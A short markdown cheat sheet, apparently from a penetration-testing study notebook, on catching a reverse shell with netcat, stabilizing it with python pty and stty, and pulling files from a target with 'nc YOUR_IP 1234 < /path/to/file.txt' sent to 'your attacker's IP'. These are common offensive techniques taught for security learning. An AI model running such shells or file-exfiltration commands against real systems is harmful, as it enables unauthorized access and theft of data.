---
share: true
---
```markdown
# Note: Reverse Shells, Netcat, and Shell Stabilization

## 1. Generate a Reverse Shell

- Use [https://www.revshells.com/](https://www.revshells.com/) to generate a reverse shell command.
- Enter your IP and an open port to get the correct payload for your target environment.

## 2. Listen for the Connection with Netcat

On your machine (the receiver), open a port to listen for the incoming shell:

```bash
nc -lnvp 4444
```

- `-l`: Listen mode
- `-n`: Numeric IP addresses only
- `-v`: Verbose
- `-p 4444`: Port number (replace with your chosen port)

## 3. Stabilize the Shell

Once you have a shell, you can stabilize it for a better interactive experience:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- Press `Ctrl + Z` to background the shell.
- Run:
  ```bash
  stty raw -echo; fg
  ```
- Press `Enter` to return to the shell.

**Optional (for better terminal support):**

```bash
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 38 columns 116
```
Or simply:
```bash
export TERM=xterm
```

## 4. Send a File from the Target to Your Machine

**On your machine (receiver):**

```bash
nc -lvnp 1234 > received_file.txt
```

**On the target (sender):**

```bash
nc YOUR_IP 1234 < /path/to/file.txt
```

- Replace `YOUR_IP` with your attacker's IP and adjust the port and file paths as needed.

## Tips

- Always use a port that is open and not blocked by firewalls.
- Shell stabilization is not always required, but it greatly improves usability.
- You can use different file names and ports as needed.

---

**Summary:**  
- Use [revshells.com](https://www.revshells.com/) to generate reverse shell commands.
- Listen with `nc -lnvp <port>`.
- Stabilize your shell for a better experience.
- Use netcat to transfer files between machines.